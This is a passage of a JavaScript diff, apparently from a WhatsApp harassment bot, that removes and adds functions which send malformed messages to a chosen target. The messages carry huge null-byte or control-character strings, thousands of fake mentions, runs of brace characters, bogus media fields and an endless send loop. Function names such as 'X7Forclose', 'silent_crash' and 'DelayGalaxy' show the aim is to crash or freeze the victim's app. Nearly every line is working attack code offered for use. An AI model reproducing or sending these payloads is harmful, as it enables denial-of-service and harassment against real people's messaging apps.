-                    stickerMessage: {
-                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
-                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-                        mimetype: type,
-                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
-                        fileLength: {
-                            low: Math.floor(Math.random() * 1000),
-                            high: 0,
-                            unsigned: true,
-                        },
-                        mediaKeyTimestamp: {
-                            low: Math.floor(Math.random() * 1700000000),
-                            high: 0,
-                            unsigned: false,
-                        },
-                        firstFrameLength: 19904,
-                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
-                        isAnimated: true,
-                        contextInfo: {
-                            participant: target,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from(
-                                    { length: 1900 },
-                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                                ),
-                            ],
-                            groupMentions: [],
-                            entryPointConversionSource: "non_contact",
-                            entryPointConversionApp: "whatsapp",
-                            entryPointConversionDelaySeconds: 467593,
-                        },
-                        stickerSentTs: {
-                            low: Math.floor(Math.random() * -20000000),
-                            high: 555,
-                            unsigned: parse,
-                        },
-                        isAvatar: parse,
-                        isAiSticker: parse,
-                        isLottie: parse,
-                    },
-                },
-            },
-        }, {});
-
-        const X7 = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "#",
-                            format: "DEFAULT"
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "galaxy_message",
-                            paramsJson: "\x10".repeat(1045000),
-                            version: 3
-                        },
-                        entryPointConversionSource: "call_permission_request"
-                    },
-                },
-            },
-        }, {
-            ephemeralExpiration: 0,
-            forwardingScore: 9741,
-            isForwarded: true,
-            font: Math.floor(Math.random() * 99999999),
-            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
-        });
-
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: stc.message,
-            },
-        }, {
-            messageId: stc.key.id,
-            participant: { jid: target },
-        });
-
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: X7.message,
-            },
-        }, {
-            messageId: X7.key.id,
-            participant: { jid: target },
-        });
-
-    } catch (err) {
-        console.error("error:", err);
-    }
-}
-
-
-async function DelayGalaxy(sock, target) {
-  const vnxmsg = generateWAMessageFromContent(
-    target,
-    {
-        interactiveResponseMessage: {
-          body: {
-            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-            title: "\u0000".repeat(250000)
-            },
-           nativeFlowResponseMessage: {
-            name: "galaxy_message", 
-            paramsJson: "\x10".repeat(1000000) + "\u0000".repeat(250000), 
-            version: 3,
-            sourceUrl: "t.me/pinzyoffc"
-          },
-           entryPointConversionSource: "call_permission_request"
-        }
-      },
-    { userJid: target }
-  );
-        
-  await sock.relayMessage(
-    target,
-      vnxmsg.message,
-    {
-      participant: { jid: target },
-      messageId: vnxmsg.key.id
-    }
-  );
-}
-
-async function X7Forclose(sock, target) {
-  let msg = generateWAMessageFromContent(
-    target,
-    {
-      imageMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
-        mimetype: "image/jpeg",
-        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
-        caption: "Pinzy𝖷𝟩",
-        fileLength: "149502",
-        height: 1397,
-        width: 1126,
-        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
-        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
-        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1777621571",
-        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
-        contextInfo: {
-          pairedMediaType: "NOT_PAIRED_MEDIA",
-          isQuestion: true,
-          isGroupStatus: true
-        },
-        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-        scanLengths: [
-          2899999999999999077,
-          1799999999999998555,
-          7699999999999999148,
-          1069999999999999164
-        ],
-        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
-      }
-    },
-    {}
-  );
-
-  await sock.relayMessage(
-    "status@broadcast",
-    msg.message,
-    {
-      statusJidList: [target],
-      messageId: msg.key.id,
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined
-                }
-              ]
-            }
-          ]
-        }
-      ]
-    }
-  );
-
-  await sock.relayMessage(
-    target,
-    {
-      groupStatusMessageV2: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: "pinzyX7",
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "call_permissiom_request",
-              paramsJson: "\u0010".repeat(1045000),
-              version: 3
-            },
-            contextInfo: {
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 2000 }, () =>
-                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                )
-              ],
-              conversionPointSource: "call_permissiom_request"
-            }
-          }
-        }
-      }
-    },
-    {}
-  );
-}
-
-
-
-async function X7ForcloseCombo(sock, target) {
-    const kosong = "\u0000".repeat(500000);
-    const spasi = " ".repeat(400000);
-    const zero = "‍".repeat(600000);
-    
-   await sock.relayMessage(target, {
-  "imageMessage": {
-    "url": "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
-    "mimetype": "image/jpeg",
-    "fileSha256": "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
-    "fileLength": "93217",
-    "caption": "X7",
-    "height": 1080,
-    "width": 1080,
-    "mediaKey": "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
-    "fileEncSha256": "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
-    "directPath": "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
-    "mediaKeyTimestamp": "1778142659",
-    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
-    "contextInfo": {
-      "pairedMediaType": "NOT_PAIRED_MEDIA",
-      "isQuestion": true,
-      "isGroupStatus": true
-    },
-    "scansSidecar": "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-    "scanLengths": [
-      9999999999999999999,
-      9999999999999999999,
-      9999999999999999999,
-      9999999999999999999
-    ],
-    "midQualityFileSha256": "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
-  }
-}, {})
-    
-    for (let i = 0; i < 30; i++) {
-        try {
-            await sock.relayMessage('status@broadcast', {
-                interactiveResponseMessage: {
-                    body: {
-                        text: kosong,
-                        format: 0
-                    },
-                    footer: {
-                        text: spasi,
-                        format: 0
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "silent_crash",
-                        paramsJson: `{\"trigger\":\"${zero}\",\"delay\":5000}`,
-                        version: 3
-                    },
-                    contextInfo: {
-                        mentionedJid: [target],
-                        isForwarded: false
-                    }
-                }
-            }, {
-                messageId: "silent_" + Date.now() + "_" + i,
-                statusJidList: [target],
-                additionalNodes: [{
-                    tag: 'meta',
-                    attrs: { from: 'system@whatsapp.net' }
-                }]
-            });
-            console.log(`[${i+1}/30] SILENT TAG KE ${target}`);
-            await new Promise(x => setTimeout(x, 200));
-        } catch(e) { console.log(e); }
-    }
-}
-
-async function X7Klik(sock, target) {
-    await sock.relayMessage(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    body: { text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" },
-                    footer: { text: "NIH" },
-                    contextInfo: {},
-                    nativeFlowMessage: {
-                        buttons: [
-                            {
-                                name: "booking_confirmation",
-                                buttonParamsJson: JSON.stringify({
-                                    booking_id: "Xyzen Official",
-                                    status: "confirmed",
-                                    business_name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-                                    service_name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-                                    appointment_time: "2026-04-28T10:00:00Z",
-                                    customer: {
-                                        name: "@pinzyoffc",
-                                        phone: "628973824776"
-                                    }
-                                })
-                            }
-                        ],
-                        messageParamsJson: "{".repeat(9999)
-                    }
-                }
-            }
-        }
-    }, {})
-}
-
-async function Woam(target) {
-    let cards = [];
-    for(let z = 0; z < 30; z++) {
-        cards.push({
-            header: {
-                title: "\0",
-                imageMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
-                    mimetype: "image/jpeg",
-                    fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
-                    fileLength: "93217",
-                    caption: "pinzyX7",
-                    height: 1080,
-                    width: 1080,
-                    mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
-                    fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
-                    directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
-                    mediaKeyTimestamp: "1778142659",
-                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
-                    contextInfo: {
-                        pairedMediaType: "NOT_PAIRED_MEDIA",
-                        isQuestion: true,
-                        isGroupStatus: true
-                    },
-                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-                    scanLengths: [
-                        9999999999999999999,
-                        9999999999999999999,
-                        9999999999999999999,
-                        9999999999999999999
-                    ],
-                    midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
-                },
-                hasMediaAttachment: true
-            },
-            nativeFlowMessage: {
-                messageParamsJson: "{".repeat(10000)
-            }
-        })
-    }
-    const msg = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "X7"
-                    },
-                    carouselMessage: {
-                        cards
-                    }
-                }
-            }
-        }
-    }, {})
-    await sock.relayMessage(target, msg.message, {
-        participant: { jid: target }
-    })
+  }, { participant: { jid: target }});
 }
 
 async function dingleyhard(sock, target, ptcp = true) {
@@ -1476,7 +4652,7 @@ async function dingleyhard(sock, target, ptcp = true) {
       message: {
         interactiveResponseMessage: {
           body: {
-            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
+            text: "𝖠𝗌𝖾𝗉𝖷𝟩",
             format: "DEFAULT"
           },
           nativeFlowResponseMessage: {
@@ -1570,7 +4746,7 @@ async function dingleyhard(sock, target, ptcp = true) {
                 message: {
                   interactiveResponseMessage: {
                     body: { 
-                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄", 
+                    text: "𝖠𝗌𝖾𝗉𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍", 
                     format: "DEFAULT"
                     },
                     nativeFlowResponseMessage: {
@@ -1594,7 +4770,7 @@ async function dingleyhard(sock, target, ptcp = true) {
         message: {
           interactiveResponseMessage: {
             body: {
-              text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
+              text: "𝖷𝟩 𝖲𝖾𝗏𝖾𝗇 𝖷",
               format: "DEFAULT"
             },
             nativeFlowResponseMessage: {
@@ -1656,114 +4832,93 @@ async function dingleyhard(sock, target, ptcp = true) {
   });
 }
 
+async function stickerUi(sock, target) {
+  try {
+    const msg = await generateWAMessageFromContent(
+      target,
+      {
+        viewOnceMessage: {
+          message: {
+            stickerPackMessage: {
+              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+              name: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
+              publisher: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
+              caption: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
 
-async function bulldozerX(sock, target) {
-while (true) {
-  await sock.relayMessage(
-    target,
-    {
-      messageContextInfo: {
-        deviceListMetadata: {
-          senderTimestamp: "1762522364",
-          recipientKeyHash: "Cla60tXwl/DbZw==",
-          recipientTimestamp: "1763925277"
-        },
-        deviceListMetadataVersion: 2,
-        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
-      },
-      eventMessage: {
-        contextInfo: {
-          expiration: 0,
-          ephemeralSettingTimestamp: "1763822267",
-          disappearingMode: {
-            initiator: "CHANGED_IN_CHAT",
-            trigger: "UNKNOWN",
-            initiatedByMe: true
-          },
-          quotedMessage: {
-            viewOnceMessage: {
-              message: {
-                interactiveResponseMessage: {
-                  body: {
-                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
-                    format: "DEFAULT" 
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: "\u0007".repeat(90000),
-                    version: 3
+              stickers: [
+                ...Array.from({ length: 4700 }, () => ({
+                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
+                  isAnimated: false,
+                  emojis: ["🦠", "🩸", "☠️", "💥"],
+                  accessibilityLabel: "",
+                  stickerSentTs: "#NullStrick",
+                  isAvatar: true,
+                  isAiSticker: true,
+                  isLottie: true,
+                  mimetype: "application/pdf"
+                }))
+              ],
+
+              fileLength: "1073741824000",
+              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
+
+              contextInfo: {
+                remoteJid: "0@s.whatsapp.net",
+                participant: target,
+                stanzaId: "1234567890ABCDEF",
+                mentionedJid: [
+                  "0@s.whatsapp.net",
+                  ...Array.from({ length: 1990 }, () =>
+                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+                  )
+                ],
+                quotedMessage: {
+                  locationMessage: {
+                    degreesLongitude: 9999,
+                    degreesLatitude: 9999,
+                    name: "#NullStrick",
+                    url: "https://Wa.me/stickerpack" + "ꦽ".repeat(10000),
+                    address: "#NullStrick"
                   }
                 }
-              }
+              },
+
+              mediaKeyTimestamp: "1747502082",
+              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
+              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+              thumbnailHeight: 252,
+              thumbnailWidth: 252,
+              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+              stickerPackSize: "999999999",
+              stickerPackOrigin: "USER_CREATED"
             }
           }
-        },
-        isCanceled: true,
-        name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-        location: {
-          degreesLatitude: 0,
-          degreesLongitude: 0,
-          name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
-        },
-        nativeFlowResponseMessage: {
-          name: "address_message",
-          paramsJson: `{"values":{"in_pin_code":"999999",
-          "building_name":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-          "landmark_area":"18",
-          "address":"pinzyX7",
-          "tower_number":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-          "city":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-          "name":"pinzyX7",
-          "phone_number":"999999999999",
-          "house_number":"13135550002",
-          "floor_number":"@3135550202",
-          "state":"X${"\u0000".repeat(900000)}"}}`,
-          version: 3
-        },
-        startTime: "1764032400",
-        extraGuestsAllowed: true,
-        isScheduleCall: true
-      }
-    },
-    { participant: { jid: target } }
-  );
+        }
+      },
+      { userJid: target }
+    );
+    
+    await sock.relayMessage(target, msg.message, {
+      messageId: msg.key.id,
+      participant: { jid: target }
+    });
+  } catch (err) {
+    console.error(err);
+  }
 }
-}
-
-async function DelayTrackingHard(sock, groupJid) {
-await sock.relayMessage(groupJid, {
-   groupStatusMessageV2: {
-      message: {
-       interactiveResponseMessage: {
-         contextInfo: {
-           urlTrackingMap: {
-            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})),
-          },
-          body: {
-            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 𝖠𝗇𝗍𝗂 𝖠𝗆𝗉𝗈𝗌"
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\u0000".repeat(9999099),
-            version: 3
-          },
-        }
-       }
-      }
-    }
-  }, { participant: { jid: targetJid } });
-
-  console.log("𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 𝖫𝗈𝖼𝗄 𝖸𝗈𝗎: " + groupJid);
-}
-
 async function button(sock, target) {
   try {
     const msg = await generateWAMessageFromContent(
       target,
       {
         buttonsMessage: {
-          text: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-          contentText: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(15000),
+          text: "#Xylent Empire",
+          contentText: "#Xylent Empire" + "ꦾ".repeat(15000),
           footerText: "ꦾ".repeat(30000),
           buttons: [
             {
@@ -1806,75 +4961,395 @@ async function button(sock, target) {
   }
 }
 
-async function stickerUi(sock, target) {
+async function X7DelayGb(sock, target) {
+ const X7Msg = {
+  groupStatusMessageV2: {
+    message: {
+     extendedTextMessage: {
+       text: "\u0000".repeat(550000),
+         contextInfo: {
+           participant: target,
+             mentionedJid: [
+               "0@s.whatsapp.net",
+                  ...Array.from(
+                  { length: 1999 },
+                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+                 )
+               ]
+             }
+           }
+         }
+       }
+     };
+     
+   const msg = generateWAMessageFromContent(target, X7Msg, {});
+        
+     await sock.relayMessage(target, msg.message, {
+            messageId: msg.key.id
+        });
+     }
+     
+     async function X7Klik(sock, target) {
+    await sock.relayMessage(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    body: { text: "Xylent Empire" },
+                    footer: { text: "NIH" },
+                    contextInfo: {},
+                    nativeFlowMessage: {
+                        buttons: [
+                            {
+                                name: "booking_confirmation",
+                                buttonParamsJson: JSON.stringify({
+                                    booking_id: "Xyzen Official",
+                                    status: "confirmed",
+                                    business_name: "Xylent Empire",
+                                    service_name: "Xylent Empire",
+                                    appointment_time: "2026-04-28T10:00:00Z",
+                                    customer: {
+                                        name: "@pinzyoffc",
+                                        phone: "628973824776"
+                                    }
+                                })
+                            }
+                        ],
+                        messageParamsJson: "{".repeat(9999)
+                    }
+                }
+            }
+        }
+    }, {})
+}
+
+async function fcbutton(sock, target) {
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "XYLENT EMPITE" + "ꦽ".repeat(35000)
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "cta_url",
+                buttonParamsJson: "{\"display_text\":\"die \",\"url\":\"https://w" + "ꦽ".repeat(35000) + "\"}"
+              },
+            ]
+          }
+        }
+      }
+    }
+  }, {});
+}
+
+async function RX7DELAYNEW(sock, target) {
+      await sock.relayMessage(target, {
+          groupStatusMessageV2: {
+              message: {
+                  interactiveMessage: {
+                      body: {
+                        text: "\u0000", 
+                        format: "DEFAULT"
+                      },
+                      nativeFlowMessage: {
+                          buttons: "{".repeat(544444)
+                      },
+                      contextInfo: {
+                       forwardingScore: 9999,
+                       isForwarded: true,
+                       entryPointConversionSource: "address_message"
+                     }
+                  }
+              }
+          }
+      }, { participant: { jid: target }});    
+
+ await sock.relayMessage(target, {
+   groupStatusMessageV2: {  
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "RX7",
+          format: "EXTENSION_1"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
